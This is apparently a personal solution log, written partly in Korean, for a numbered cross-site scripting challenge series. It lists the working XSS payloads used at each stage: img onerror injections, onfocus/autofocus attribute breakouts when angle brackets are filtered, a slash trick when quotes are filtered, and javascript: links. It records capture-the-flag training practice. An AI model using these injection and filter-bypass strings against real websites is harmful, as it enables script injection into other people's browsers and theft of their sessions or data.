# xsschall
quic_xss

#1
//aaaaa"</b><img/src=x onerror=alert(document.domain)><b>

#2
aaa"><img/src onerror=alert(document.domain) alt="1
  
#3 p2 =japan 부분에 입력
aaaaa"</b><img/src=x onerror=alert(document.domain)<b>


#4 p3 hackme 부분
aaaaa"</b><img/src=x onerror=alert(document.domain)<b>

#5 걍(maxlength 보는데 걍.. 프록시잡아서..)
aaaaa"</b><img/src=x onerror=alert(document.domain)<b>


###6 <> filter 상태에서 / onfocus 핸들러로 트리거

1" onfocus=alert(document.domain) "

" onerror=alert() alt="
" autofocus onfocus=alert(1)"
1" onfocus=alert(document.domain) "
1" onfocus=alert(document.domain) autofocus "
/// ESC키 연타 + 마우스 이동해서 포커스 해제~!~!~!~!~!
<input type="text" onmouseover=alert()"">
<input type="text" name="p1" size="50" value="1" onfocus=alert() ""> 

#7 <> filter 에다가 "도 필더다 ~ 근데 걍됨
1" onfocus=alert(document.domain) "
<input type="text" name="p1" size="50" value=1&quot; onfocus=alert(document.domain) &quot;>

[풀이]
" 필터링을 우회 할 수 있는 방법을 사용해야 할 것 같습니다.
[문제 정답]
정답 : / onfocus=alert(document.domain)
필터링되는 " 대신 /를 이용하여 XSS 공격 구문을 삽입합니다.


#8 href=구문 상황에서 실행  // link 형식
javascript:alert(document.domain)
<a href="javascript:alert(document.domain)">





"<>를 인풋에 집어넣어서 필터링되는지보고
